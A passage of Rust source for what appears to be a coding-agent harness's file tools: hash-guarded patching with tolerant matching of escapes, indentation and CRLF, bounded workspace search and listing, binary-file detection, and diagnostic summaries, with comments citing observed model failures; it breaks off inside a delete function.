/// The text a JSON string would hold if its escapes were meant literally.
///
/// D7, from the R2 rerun: twelve `replace_text` calls were refused because the
/// `find` text carried `\n`, `\t` and `\"` as two characters rather than one
/// -- a deployment quoting its JSON twice. What it meant is unambiguous, and
/// using it is not the harness inventing an edit: the decoded text is used only
/// where the literal one appears nowhere and the decoded one appears exactly
/// once, and the correction is reported with the result.
fn decoded_escapes(find: &str) -> Option<String> {
    if !find.contains('\\') {
        return None;
    }
    let mut decoded = String::with_capacity(find.len());
    let mut characters = find.chars();
    while let Some(character) = characters.next() {
        if character != '\\' {
            decoded.push(character);
            continue;
        }
        match characters.next() {
            Some('n') => decoded.push('\n'),
            Some('t') => decoded.push('\t'),
            Some('r') => decoded.push('\r'),
            Some('"') => decoded.push('"'),
            Some('\'') => decoded.push('\''),
            Some('\\') => decoded.push('\\'),
            // An escape this does not know is left as written: the point is to
            // undo double quoting, not to guess.
            Some(other) => {
                decoded.push('\\');
                decoded.push(other);
            }
            None => decoded.push('\\'),
        }
    }
    (decoded != find).then_some(decoded)
}

/// The one region of `text` that `find` names once blank lines and each
/// line's surrounding whitespace are set aside, as the exact text of the file.
///
/// A model copying a block from a file drops the blank line inside it or
/// re-indents it, and an exact match then fails while the meaning is not in
/// doubt. Measured 2026-09-22 (Qwen3.6-35B-A3B): three identical `apply_patch`
/// refusals, "hunk 1 does not appear", for a two-line hunk missing the blank
/// line between its lines. Only a unique match is used, and what is replaced
/// is the file's own text, from the first matched character to the last, so
/// nothing outside the block can change.
fn loose_region(text: &str, find: &str) -> Option<String> {
    let wanted: Vec<&str> = find
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty())
        .collect();
    if wanted.is_empty() {
        return None;
    }
    // Each line of the file with its byte span.
    let mut lines: Vec<(usize, &str)> = Vec::new();
    let mut offset = 0;
    for line in text.split_inclusive('\n') {
        lines.push((offset, line.trim_end_matches(['\n', '\r'])));
        offset += line.len();
    }
    let mut found: Option<(usize, usize)> = None;
    for start in 0..lines.len() {
        if lines[start].1.trim() != wanted[0] {
            continue;
        }
        let mut matched = 0;
        let mut index = start;
        let mut last = start;
        while index < lines.len() && matched < wanted.len() {
            let line = lines[index].1.trim();
            if line.is_empty() {
                index += 1;
                continue;
            }
            if line != wanted[matched] {
                break;
            }
            matched += 1;
            last = index;
            index += 1;
        }
        if matched == wanted.len() {
            let (first_offset, first_line) = lines[start];
            let begin = first_offset + (first_line.len() - first_line.trim_start().len());
            let (last_offset, last_line) = lines[last];
            let end = last_offset + last_line.trim_end().len();
            if found.is_some() {
                return None;
            }
            found = Some((begin, end));
        }
    }
    found.map(|(begin, end)| text[begin..end].to_owned())
}

/// The exact `find` text the caller meant, when `find` does not occur as
/// written but its lines do, once, with other blank lines or indentation.
fn trimmed_find(find: &str) -> &str {
    find.trim()
}

fn where_it_diverges(text: &str, find: &str) -> String {
    let appears = |length: usize| find.is_char_boundary(length) && text.contains(&find[..length]);
    // Longest matching prefix, by bisection on a monotone predicate.
    let (mut low, mut high) = (0usize, find.len());
    while low < high {
        let mid = high - (high - low) / 2;
        if appears(mid) {
            low = mid;
        } else {
            high = mid - 1;
        }
    }
    if low == 0 {
        return "None of it matches, not even its first characters, so this is the wrong file or \
                the wrong text entirely."
            .into();
    }
    let matched = &find[..low];
    let Some(at) = text.find(matched) else {
        return "None of it matches.".into();
    };
    let line = text[..at].matches('\n').count() + 1;
    // What the file holds where the two stop agreeing, and what was expected
    // there, so the difference is visible without another read.
    let file_tail = &text[at + matched.len()..];
    let expected_tail = &find[low..];
    format!(
        "Its first {} characters do match, starting at line {line}. There the file continues \
         {:?} and the find text continues {:?}.",
        matched.chars().count(),
        snippet(file_tail),
        snippet(expected_tail),
    )
}

/// A short, single-line window into text, for a refusal that has to stay short.
fn snippet(text: &str) -> String {
    let taken: String = text.chars().take(60).collect();
    if text.chars().nth(60).is_some() {
        format!("{taken}...")
    } else {
        taken
    }
}

/// Which files a failing command's output points at, counted, first one named.
///
/// A compiler prints a flat list, and a list is read by volume. Measured on two
/// independent runs of an 80B building the same Angular site: the root cause
/// was four `TS2304` errors in `app.routes.ts`, which used four page classes
/// without importing them. The same output also named the four page files nine
/// to eleven times, for faults that were consequences of it. Both runs went to
/// the pages -- six edits each in one run, four in the other -- and left the
/// file the errors actually named alone. The information was all there: full
/// paths, line and column, the source line with a caret under the symbol.
///
/// So this counts rather than explains. It states which files the output names
/// and how often, and which one the first diagnostic points at, because a
/// compiler reports in dependency order and the first failure is the one least
/// likely to be a consequence of another. It adds nothing that is not already
/// in the output; it only spares the reader the tally.
///
/// `None` when the output names no file in the `path:line:column` form, which
/// is most commands. This is not an attempt to understand arbitrary output.
fn diagnostics_summary(stdout: &str, stderr: &str) -> Option<String> {
    static PATTERN: std::sync::OnceLock<Regex> = std::sync::OnceLock::new();
    let pattern = PATTERN.get_or_init(|| {
        Regex::new(r"([A-Za-z0-9_./\\-]+\.[A-Za-z0-9]+):(\d+):(\d+)").expect("a valid pattern")
    });

    let mut order: Vec<String> = Vec::new();
    let mut counts: std::collections::BTreeMap<String, usize> = std::collections::BTreeMap::new();
    for capture in pattern
        .captures_iter(stdout)
        .chain(pattern.captures_iter(stderr))
    {
        let path = capture[1].to_string();
        if !counts.contains_key(&path) {
            order.push(path.clone());
        }
        *counts.entry(path).or_default() += 1;
    }
    let first = order.first()?.clone();

    let mut named: Vec<(usize, String)> = counts
        .into_iter()
        .map(|(path, count)| (count, path))
        .collect();
    // Most-cited first, and ties broken by name so the line is stable between
    // two runs of the same failing build.
    named.sort_by(|a, b| b.0.cmp(&a.0).then_with(|| a.1.cmp(&b.1)));
    let listed = named
        .iter()
        .map(|(count, path)| format!("{path} ({count})"))
        .collect::<Vec<_>>()
        .join(", ");

    Some(format!(
        "Files named by this output, with how many times each is named: {listed}. The first \
         one reported is {first}; a later failure is often a consequence of an earlier one, so \
         the count is not the order to fix them in."
    ))
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolResult {
    pub exit_code: Option<i32>,
    pub stdout: String,
    pub stderr: String,
    pub duration_ms: u128,
    pub redacted: bool,
    pub artifact_hash: String,
    #[serde(default)]
    pub stdout_truncated: bool,
    #[serde(default)]
    pub stderr_truncated: bool,
    /// Whether the process actually ran inside a sandbox. Recorded rather than
    /// assumed so an unsandboxed run is visible in the audit.
    pub sandboxed: bool,
    /// Which files a failing command's own output points at, counted.
    ///
    /// Present only when the command failed and its output names files in the
    /// `path:line:column` form compilers and linters use. See
    /// [`diagnostics_summary`].
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub failing_files: Option<String>,
    /// The folder under the workspace root the command ran in, when it was
    /// not the root itself, with what that means for the paths it was given.
    /// See [`ran_in`].
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ran_in: Option<String>,
}
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileReadResult {
    pub path: String,
    pub content: String,
    pub truncated: bool,
    /// Hash of the whole file, not of the window returned. An edit is guarded
    /// against the file as it is on disk, so a partial read still yields a
    /// usable hash. Repeated under `expected_hash` because that is the name of
    /// the parameter it must be passed to.
    pub artifact_hash: String,
    pub expected_hash: String,
    pub redacted: bool,
    /// Lines in the whole file, so a caller can tell it has seen only part.
    pub total_lines: usize,
    /// One-based line the returned window starts at.
    pub first_line: usize,
    /// Present when only part of the file was returned: what the hash covers,
    /// and which tool edits only the part shown. Seen 2026-09-18 (Part E,
    /// pyparsing-iadd): after reading lines 521-620 with the hash beside them,
    /// a model sent that hash to `apply_replace` with one method as the body,
    /// reading it as "replace what I see", and a 940-line file became 5 lines.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub edit_note: Option<String>,
    /// For a long document read whole: its headings with their line numbers,
    /// so the sections needed can be read by window; see
    /// [`read_file_for_model`].
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub outline: Option<String>,
    /// For a window that starts inside a definition, the definitions it
    /// starts in; see [`enclosing_definitions`].
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub within: Option<String>,
}
/// One matching line, without the path that would repeat on every one of them.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SearchLine {
    pub line: usize,
    pub excerpt: String,
    pub redacted: bool,
    /// The definitions this line sits inside, outermost first; see
    /// [`enclosing_definitions`].
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub within: Option<String>,
}

/// One file's share of a search, and how much of it was left out.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SearchFile {
    pub path: String,
    pub lines: Vec<SearchLine>,
    /// Matches in this file beyond the ones listed, held back by the per-file
    /// cap. Distinct from `SearchResult::truncated`, which is about the search
    /// stopping rather than about one file being summarised.
    pub more: usize,
}

/// What a search found, and whether that is all of it.
///
/// This was a bare `Vec`, and every other tool result in this crate reports its
/// own bounding: a file read carries `truncated` and `total_lines`, a command
/// carries `stdout_truncated`, a fetch carries `truncated`. Search could not,
/// so a query matching five thousand lines came back as two hundred and read
/// exactly like a query that matched two hundred. A run concluding "the symbol
/// is used in these places" from that was misled by the harness, not by the
/// model -- and the conclusion looked perfectly sound.
///
/// Matches are grouped by file rather than listed flat, and each file yields at
/// most `MAX_MATCHES_PER_FILE` lines. Both are about spending the same bytes on
/// more information. Measured by this crate's own fixture: fifty files of a
/// hundred matches each, asked for two hundred, used to return two hundred
/// lines that all came from the first two files -- a caller reading it learned
/// where the term is dense and nothing about the other forty-eight files that
/// contain it. The grouping is also shorter on the wire, since the path stops
/// repeating on every line, which is the direction the withdrawn search-context
/// change (`4f17469`: 31% more cost, nothing saved) says a search result should
/// move in.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SearchResult {
    pub files: Vec<SearchFile>,
    /// Files with at least one match, including any the caps left out.
    pub files_matched: usize,
    /// Lines actually returned, summed over the files.
    pub matches_returned: usize,
    /// The search stopped early: at the match cap, at the output limit, or at
    /// its deadline. There are more matches than these.
    pub truncated: bool,
    /// Files whose *path* contains the query, whatever their content.
    ///
    /// A caller looking for a file by name has no other way to find it, and
    /// searching content for a name that only appears in the file name
    /// returns nothing. Measured 2026-09-18: a run searched for `hex-escape`
    /// thirteen times across the test data, got nothing each time, and spent
    /// half its action budget there -- while `hex-escape.toml` sat in the tree.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub files_named: Vec<String>,
    /// How the search was read, where that differs from what was written.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub note: Option<String>,
}
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TreeEntry {
    pub path: String,
    pub directory: bool,
}
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApplyResult {
    pub path: String,
    /// What the harness had to correct in the call to apply it, where it did.
    /// Recorded rather than silent: an edit that landed somewhere the caller
    /// did not literally ask for is a fact the audit must carry.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub normalized: Option<String>,
    pub previous_hash: String,
    pub new_hash: String,
    /// The same value as `new_hash`, under the name of the parameter that
    /// consumes it. A result field called `new_hash` and a parameter called
    /// `expected_hash` are one value under two names, and the mapping has to
    /// be inferred. Measured: a model re-sent the pre-edit hash four times
    /// after a successful edit, having never made that inference.
    pub expected_hash: String,
    /// Something about the file as written that will fail when it runs and
    /// that no syntax check sees. Measured on Qwen3-14B building an HTTP API:
    /// `server.js` required `express`, nothing installed it, `node --check`
    /// passed, and the run declared completion on a server that could not
    /// start.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub warning: Option<String>,
    /// The changed lines as the file now reads them, numbered, with a few
    /// lines either side. Measured on Qwen3-14B writing a test file: seven
    /// edits to its first lines, each answered by `Identifier 'Inventory' has
    /// already been declared`, because it never saw that an earlier edit had
    /// left a second declaration above the one it kept replacing. A hash says
    /// the edit landed; only the text says what the file became.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub excerpt: Option<String>,
}

/// Lines of context shown either side of a change.
const EXCERPT_CONTEXT: usize = 3;
/// Lines an excerpt shows at most; past this the change is summarized.
const EXCERPT_LINES: usize = 40;

/// The region of `after` that differs from `before`, numbered as the file now
/// reads, or nothing when the two are the same.
pub fn changed_excerpt(before: &str, after: &str) -> Option<String> {
    let old: Vec<&str> = before.lines().collect();
    let new: Vec<&str> = after.lines().collect();
    let prefix = old.iter().zip(&new).take_while(|(a, b)| a == b).count();
    if prefix == old.len() && prefix == new.len() {
        return None;
    }
    let suffix = old[prefix..]
        .iter()
        .rev()
        .zip(new[prefix..].iter().rev())
        .take_while(|(a, b)| a == b)
        .count();
    let first = prefix.saturating_sub(EXCERPT_CONTEXT);
    let last = (new.len() - suffix + EXCERPT_CONTEXT).min(new.len());
    let mut shown: Vec<String> = new[first..last]
        .iter()
        .enumerate()
        .map(|(i, line)| format!("{:>5}| {line}", first + i + 1))
        .collect();
    if shown.len() > EXCERPT_LINES {
        let hidden = shown.len() - EXCERPT_LINES;
        shown.truncate(EXCERPT_LINES);
        shown.push(format!("  ... {hidden} more changed lines"));
    }
    Some(shown.join("\n"))
}

/// Lists a bounded, policy-filtered workspace tree.
/// Directories excluded whatever the repository says about them.
/// Files above this are inventory, not searchable text.
const MAX_SEARCHED_BYTES: u64 = 1_000_000;

/// Lines one file may contribute to a search before the rest become a count.
///
/// The bound that turns a match list into a map. Named rather than inline for
/// the same reason `pwr-repo` names its ranking weights: a number that
/// decides what a caller is shown should be arguable rather than
/// reverse-engineered.
const MAX_MATCHES_PER_FILE: usize = 8;

/// How large a compiled pattern may get.
///
/// `regex` runs in linear time and does not backtrack, so there is no
/// catastrophic match to defend against. What a caller can still do is write a
/// pattern whose *compilation* explodes -- a bounded repetition over a large
/// class -- and this is the bound on that, refused before any file is read.
const MAX_REGEX_BYTES: usize = 1 << 20;

/// Directories a workspace listing never shows and a search never walks.
///
/// `.pwr-scratch` is the harness's own: a provisioned command runs with HOME
/// and TMPDIR redirected there, so it fills with npm logs and compile caches
/// that have nothing to do with the repository. Measured on an Angular build:
/// `list_tree` with a budget of 100 entries spent 97 of them inside it and
/// never reached `src/`, and the deployment then made nine `search` calls
/// hunting for files by name because the listing had told it nothing. Showing
/// a model our own scratch space is not a judgement call.
///
/// `.venv` for the reason `node_modules` is here: a Python virtual environment
/// is installed packages, and a listing or search that reaches into one spends
/// its budget on other people's code. The repository index excludes it too.
const POLICY_EXCLUSIONS: [&str; 6] = [
    ".git",
    "target",
    "node_modules",
    ".venv",
    STATE_DIRECTORY,
    SCRATCH_DIRECTORY,
];

/// Walks the workspace the way the index does.
///
/// `Search` and `ListTree` used to do their own `read_dir` and skip four known
/// directory names, while the repository index walked under full gitignore
/// semantics. A file deliberately excluded from retrieval -- an environment
/// file among them -- was therefore still reachable through a tool, which is
/// the ignore rules holding in one direction only.
///
/// Order is by path rather than by whatever the filesystem returns, so two
/// listings of an unchanged workspace are the same listing. A tool result that
/// feeds a prompt should not depend on directory order.
fn walk_workspace(root: &Path) -> Result<Vec<(PathBuf, bool)>, ToolError> {
    walk_workspace_filtered(root, None)
}

/// The same walk, narrowed to the paths an override admits.
///
/// The override goes to the walker rather than to a filter over its output, so
/// a glob that admits nothing under a directory costs nothing to descend into.
/// `Override::matched` deliberately never turns a whitelist into a directory
/// refusal, so narrowing to `**/*.rs` still reaches a `.rs` file at any depth
/// rather than stopping at the first directory that is not one.
fn walk_workspace_filtered(
    root: &Path,
    filter: Option<&ignore::overrides::Override>,
) -> Result<Vec<(PathBuf, bool)>, ToolError> {
    let mut builder = ignore::WalkBuilder::new(root);
    builder
        .hidden(false)
        .git_ignore(true)
        // A workspace is untrusted input whether or not it is a checkout.
        .require_git(false)
        .git_global(false)
        .git_exclude(true)
        .parents(false)
        .follow_links(false)
        .sort_by_file_path(|a, b| a.cmp(b))
        .filter_entry(|entry| {
            !POLICY_EXCLUSIONS
                .iter()
                .any(|blocked| entry.file_name() == *blocked)
                && !entry
                    .file_name()
                    .to_string_lossy()
                    .starts_with(atomic::TEMPORARY_PREFIX)
        });
    if let Some(filter) = filter {
        builder.overrides(filter.clone());
    }
    let walker = builder.build();
    let mut entries = Vec::new();
    for entry in walker {
        let entry =
            entry.map_err(|error| ToolError::Denied(format!("unreadable path: {error}")))?;
        let path = entry.path().to_path_buf();
        if path == root {
            continue;
        }
        // symlink_metadata keeps a link pointing outside the root from being
        // presented as though it lived inside it.
        let metadata = std::fs::symlink_metadata(&path)?;
        if metadata.file_type().is_symlink() {
            continue;
        }
        entries.push((path, metadata.is_dir()));
    }
    Ok(entries)
}

pub fn list_tree(policy: &ToolPolicy, max_entries: usize) -> Result<Vec<TreeEntry>, ToolError> {
    list_tree_under(policy, max_entries, None)
}

/// [`list_tree`], limited to one directory of the workspace when `under` names
/// one. Paths come back relative to the workspace root, as they always do, so
/// they can be read without translating them.
pub fn list_tree_under(
    policy: &ToolPolicy,
    max_entries: usize,
    under: Option<&str>,
) -> Result<Vec<TreeEntry>, ToolError> {
    let prefix = match under
        .map(str::trim)
        .filter(|dir| !dir.is_empty() && *dir != ".")
    {
        None => None,
        Some(dir) => {
            let resolved = match policy.resolve(Path::new(dir)) {
                Ok(resolved) => resolved,
                // A folder the person attached for reading: listed where it
                // is, with paths as the caller wrote them, so each one can be
                // passed straight to read_file. Chat mode has no workspace,
                // and its folders are only these (2026-09-23).
                Err(refused) => match policy.resolve_readable(Path::new(dir)) {
                    Ok(reference) if reference.is_dir() => {
                        return list_reference(policy, max_entries, dir, &reference);
                    }
                    _ => return Err(refused),
                },
            };
            if !resolved.is_dir() {
                // What is there, said here: a model starting a project lists
                // the folders it expects -- `src`, `include`, `scripts` -- and
                // each refusal that only pointed at list_tree cost a second
                // call to learn the root (nine on the stack matrix of
                // 2026-09-26).
                let mut top: Vec<String> = std::fs::read_dir(&policy.root)
                    .map(|entries| {
                        entries
                            .flatten()
                            .map(|entry| {
                                let name = entry.file_name().to_string_lossy().into_owned();
                                if entry.path().is_dir() {
                                    format!("{name}/")
                                } else {
                                    name
                                }
                            })
                            .filter(|name| !name.starts_with(".pwr") && name != ".git/")
                            .collect()
                    })
                    .unwrap_or_default();
                top.sort();
                top.truncate(40);
                let what = if resolved.exists() {
                    "is a file, not a directory"
                } else {
                    "does not exist yet"
                };
                return Err(ToolError::Denied(format!(
                    "{dir} {what}. The workspace root holds: {}",
                    if top.is_empty() {
                        "nothing yet".to_owned()
                    } else {
                        top.join(", ")
                    }
                )));
            }
            // Compared as a path relative to the root: `resolve` answers
            // with the canonical path (`/private/var/...` on macOS) and the
            // walk with the root as given (`/var/...`).
            let root = policy
                .root
                .canonicalize()
                .unwrap_or_else(|_| policy.root.clone());
            Some(
                resolved
                    .strip_prefix(&root)
                    .map(Path::to_path_buf)
                    .unwrap_or(resolved),
            )
        }
    };
    let deadline = std::time::Instant::now() + policy.timeout;
    let mut output = Vec::new();
    let mut output_bytes = 0usize;
    for (path, directory) in walk_workspace(&policy.root)? {
        if let Some(prefix) = &prefix {
            let relative = path.strip_prefix(&policy.root).unwrap_or(&path);
            if !(relative.starts_with(prefix) && relative != prefix.as_path()) {
                continue;
            }
        }
        if std::time::Instant::now() >= deadline {
            return Err(ToolError::Timeout);
        }
        if output.len() >= max_entries {
            break;
        }
        let relative = path
            .strip_prefix(&policy.root)
            .unwrap_or(&path)
            .display()
            .to_string();
        let cost = relative.len().saturating_add(1);
        if output_bytes.saturating_add(cost) > policy.output_limit {
            break;
        }
        output_bytes = output_bytes.saturating_add(cost);
        output.push(TreeEntry {
            path: relative,
            directory,
        });
    }
    Ok(output)
}

/// A reference folder's tree, its paths spelled from `named` -- the way the
/// caller addressed the folder -- so a listed path is a readable path.
fn list_reference(
    policy: &ToolPolicy,
    max_entries: usize,
    named: &str,
    folder: &Path,
) -> Result<Vec<TreeEntry>, ToolError> {
    let deadline = std::time::Instant::now() + policy.timeout;
    let named = named.trim_end_matches('/');
    let mut output = Vec::new();
    let mut output_bytes = 0usize;
    for (path, directory) in walk_workspace(folder)? {
        let Ok(relative) = path.strip_prefix(folder) else {
            continue;
        };
        if relative.as_os_str().is_empty() {
            continue;
        }
        if std::time::Instant::now() >= deadline {
            return Err(ToolError::Timeout);
        }
        if output.len() >= max_entries {
            break;
        }
        let shown = format!("{named}/{}", relative.display());
        let cost = shown.len().saturating_add(1);
        if output_bytes.saturating_add(cost) > policy.output_limit {
            break;
        }
        output_bytes = output_bytes.saturating_add(cost);
        output.push(TreeEntry {
            path: shown,
            directory,
        });
    }
    Ok(output)
}

/// One replacement within a file.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Hunk {
    pub find: String,
    pub replace: String,
}

/// Leading bytes that identify a file as binary, with a name to say so.
///
/// The NUL scan these checks were built on misses a whole class of file. A PDF
/// opens with an ASCII header, a comment line and an object graph, and its
/// binary payload is deflate- or ASCII85-encoded: it can carry no NUL at all in
/// its first 4096 bytes. Measured on a real one -- 160 KiB, zero NUL bytes in
/// the prefix -- which a read therefore returned as text. The caller received
/// the header, some link annotations and an encoded image stream in place of
/// the document, paid for that in context twice over a compaction, searched it
/// for `/URI` because the header looked searchable, and never learned that the
/// file was not text at all. A signature says what the NUL scan cannot.
///
/// The list is not a format registry. It covers what plausibly lands in a
/// workspace and encodes its payload rather than embedding NUL early, which is
/// the only case the scan below already gets wrong.
const BINARY_SIGNATURES: &[(&[u8], &str)] = &[
    (b"%PDF-", "a PDF document"),
    (
        b"PK\x03\x04",
        "a ZIP archive, which is also how .docx, .xlsx and .jar are stored",
    ),
    (b"\xff\xd8\xff", "a JPEG image"),
    (b"GIF87a", "a GIF image"),
    (b"GIF89a", "a GIF image"),
    (b"\x89PNG\r\n\x1a\n", "a PNG image"),
    (b"RIFF", "a RIFF container, such as WAV or WebP"),
    (b"\x1f\x8b", "a gzip stream"),
    (b"BZh", "a bzip2 archive"),
    (b"7z\xbc\xaf\x27\x1c", "a 7-Zip archive"),
    (b"Rar!\x1a\x07", "a RAR archive"),
    (b"OggS", "an Ogg container"),
    (b"fLaC", "a FLAC stream"),
    (b"ID3", "an MP3 file"),
    (b"wOFF", "a WOFF font"),
    (b"wOF2", "a WOFF2 font"),
    (b"OTTO", "an OpenType font"),
    (b"\x7fELF", "an ELF executable"),
];

/// Says what makes `prefix` binary, phrased for a caller that asked for text.
///
/// One place, because four call sites had grown the same NUL scan and would
/// have had to grow the same signature table beside it.
fn binary_reason(prefix: &[u8]) -> Option<String> {
    if let Some((_, name)) = BINARY_SIGNATURES
        .iter()
        .find(|(magic, _)| prefix.starts_with(magic))
    {
        return Some((*name).to_string());
    }
    prefix
        .iter()
        .take(4096)
        .any(|byte| *byte == 0)
        .then(|| "binary data".to_string())
}

/// Refuses a text operation on a binary file, naming the format and the way out.
///
/// A refusal that says only "denied" invites the next attempt, and the run that
/// motivated this spent eight actions and both its compactions on variations of
/// one impossible read. Naming the format ends that line of attempts, and
/// saying that no tool in the run will extract it turns a dead end into a
/// prerequisite the caller can report.
fn deny_binary(relative: &Path, reason: &str, verb: &str) -> ToolError {
    let way_out = if verb == "read as text" {
        "Use extract_document on it to recover its text, or report the prerequisite if that refuses too"
    } else {
        "Nothing in this run edits it; report the prerequisite"
    };
    ToolError::Denied(format!(
        "{} is {}, not text, so it cannot be {verb}. {way_out}, rather than trying \
         another command or another window of the same file.",
        relative.display(),
        reason
    ))
}

/// Applies several replacements to one file under a single hash guard.
///
/// A change touching three places in a file was three whole-file rewrites,
/// each carrying the entire file and each invalidating the hash the next one
/// was written against -- so the second and third arrived stale and the run
/// spent its budget re-reading. This is the same guard, once.
///
/// Every hunk must match exactly once, and all of them are checked before any
/// is applied: a patch that half-lands leaves a file in a state nobody
/// described, which is worse than one that does not land at all.
/// Whether every line break in `bytes` is CRLF.
fn uses_crlf(bytes: &[u8]) -> bool {
    let breaks = bytes.iter().filter(|byte| **byte == b'\n').count();
    breaks > 0 && bytes.windows(2).filter(|pair| pair == b"\r\n").count() == breaks
}

/// `text` with its line breaks written as CRLF, if it had any bare LF.
///
/// A model cannot type a carriage return through a tool call: seen 2026-09-19
/// (suite A3, `a3-crlf-line-endings`), a run rewrote a CRLF file with LF, then
/// wrote `\r\n` as four literal characters, and finally converted the file
/// with a Python script -- fourteen turns for a three-turn task. An edit to a
/// file whose every break is CRLF keeps it that way.
fn with_crlf(text: &str) -> Option<String> {
    let bare = text
        .char_indices()
        .any(|(at, c)| c == '\n' && !text[..at].ends_with('\r'));
    bare.then(|| text.replace("\r\n", "\n").replace('\n', "\r\n"))
}

const LOOSE_NOTE: &str = "the `find` text did not match exactly but its lines did, once, with different blank lines or indentation; that block of the file was edited";
const CRLF_NOTE: &str = "the file's line breaks are CRLF and the text sent used LF; it was \
                         matched and written with CRLF";

pub fn apply_patch(
    policy: &ToolPolicy,
    relative: &Path,
    expected_hash: &str,
    hunks: &[Hunk],
) -> Result<ApplyResult, ToolError> {
    policy.refuse_if_protected(relative)?;
    if hunks.is_empty() {
        return Err(ToolError::Denied("a patch needs at least one hunk".into()));
    }
    if let Some(approval) = edit_approval(relative) {
        policy.require(approval)?;
    }
    let path = policy.resolve(relative)?;
    if !path.exists() {
        return Err(missing_file(relative, "edit"));
    }
    let original = std::fs::read(&path)?;
    if let Some(reason) = binary_reason(&original) {
        return Err(deny_binary(relative, &reason, "patched"));
    }
    let current = hash_bytes(&original);
    if !hash_matches(&current, expected_hash) {
        return Err(ToolError::Denied(format!(
            "stale file hash; the file now hashes to {current}. Reread it before patching."
        )));
    }
    let mut content = String::from_utf8_lossy(&original).to_string();
    let mut normalized = None;
    let converted: Vec<Hunk>;
    let hunks = if uses_crlf(&original)
        && hunks
            .iter()
            .any(|hunk| with_crlf(&hunk.find).is_some() || with_crlf(&hunk.replace).is_some())
    {
        normalized = Some(CRLF_NOTE.to_string());
        converted = hunks
            .iter()
            .map(|hunk| Hunk {
                find: with_crlf(&hunk.find).unwrap_or_else(|| hunk.find.clone()),
                replace: with_crlf(&hunk.replace).unwrap_or_else(|| hunk.replace.clone()),
            })
            .collect();
        converted.as_slice()
    } else {
        hunks
    };

    // A hunk whose lines are in the file once, with a blank line or an indent
    // the caller dropped, is read as that block of the file.
    let loosened: Vec<Hunk>;
    let hunks = if hunks.iter().any(|hunk| {
        !hunk.find.is_empty()
            && !content.contains(&hunk.find)
            && loose_region(&content, &hunk.find).is_some()
    }) {
        normalized = Some(LOOSE_NOTE.to_string());
        loosened = hunks
            .iter()
            .map(|hunk| {
                match (!content.contains(&hunk.find))
                    .then(|| loose_region(&content, &hunk.find))
                    .flatten()
                {
                    Some(region) => Hunk {
                        find: region,
                        replace: hunk.replace.trim().to_owned(),
                    },
                    None => hunk.clone(),
                }
            })
            .collect();
        loosened.as_slice()
    } else {
        hunks
    };
    // Checked first, applied second. A hunk that would match text an earlier
    // hunk introduced is not the caller's intent, and finding that out halfway
    // through is finding it out too late.
    for (index, hunk) in hunks.iter().enumerate() {
        if hunk.find.is_empty() {
            return Err(ToolError::Denied(format!(
                "hunk {} has nothing to find",
                index + 1
            )));
        }
        match content.matches(&hunk.find).count() {
            1 => {}
            0 if content.contains(&hunk.replace) => {
                return Err(ToolError::Denied(format!(
                    "hunk {} is already applied: its replacement is present and its find text is not",
                    index + 1
                )));
            }
            0 => {
                // Where it stops matching, as `replace_text` says it: a
                // refusal without the file's real text was retried unchanged.
                return Err(ToolError::Denied(format!(
                    "hunk {} does not appear in {}. {}",
                    index + 1,
                    relative.display(),
                    where_it_diverges(&content, &hunk.find)
                )));
            }
            found => {
                return Err(ToolError::Denied(format!(
                    "hunk {} matches {found} times; make it unique so the edit is not the wrong one",
                    index + 1
                )));
            }
        }
    }
    for hunk in hunks {
        content = content.replacen(&hunk.find, &hunk.replace, 1);
    }
    if content.len() > policy.output_limit {
        return Err(ToolError::Denied(
            "patched content exceeds policy size limit".into(),
        ));
    }
    atomic::write_atomic(&path, content.as_bytes(), atomic::Expect::Hash(&current))?;
    let new_hash = hash_bytes(content.as_bytes());
    Ok(ApplyResult {
        path: relative.display().to_string(),
        normalized,
        previous_hash: expected_hash.to_string(),
        expected_hash: new_hash.clone(),
        new_hash,
        warning: written_file_warning(policy, &path, relative, &content),
        excerpt: changed_excerpt(&String::from_utf8_lossy(&original), &content),
    })
}

/// What a filesystem change did, for the audit and the next call.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PathChange {
    pub path: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub from: Option<String>,
    /// Files affected, so a caller can tell one file from a directory tree.
    pub entries: usize,
}

/// Creates a directory, and its parents, inside the workspace.
///
/// The surface was read, create and replace, so a task that reorganises files
/// could not be expressed at all -- the agent could write a file into a new
/// directory but never make an empty one, move anything, or remove what it had
/// superseded.
pub fn make_directory(policy: &ToolPolicy, relative: &Path) -> Result<PathChange, ToolError> {
    let path = policy.resolve(relative)?;
    if path.is_file() {
        return Err(ToolError::Denied(
            "a file already exists at that path".into(),
        ));
    }
    std::fs::create_dir_all(&path)?;
    Ok(PathChange {
        path: relative.display().to_string(),
        from: None,
        entries: 0,
    })
}

/// Deletes a file, or a directory and what it contains.
///
/// Guarded by the hash of what is being removed, exactly as an edit is: a
/// delete is the most irreversible edit there is, and "the file I read" and
/// "the file on disk" being different matters more here than anywhere else.
/// A directory has no single hash, so removing one is deliberate rather than
/// guarded -- `recursive` has to be asked for, and the count of what went is
/// returned so the audit says how much.
pub fn delete_path(
    policy: &ToolPolicy,
    relative: &Path,
    expected_hash: Option<&str>,
    recursive: bool,
) -> Result<PathChange, ToolError> {
    policy.refuse_if_protected(relative)?;
    let path = policy.resolve(relative)?;
    if std::fs::symlink_metadata(&path).is_err() {
        return Err(missing_file(relative, "delete"));
    }
    let metadata = std::fs::symlink_metadata(&path)?;
    if metadata.file_type().is_symlink() {
        return Err(ToolError::Denied(
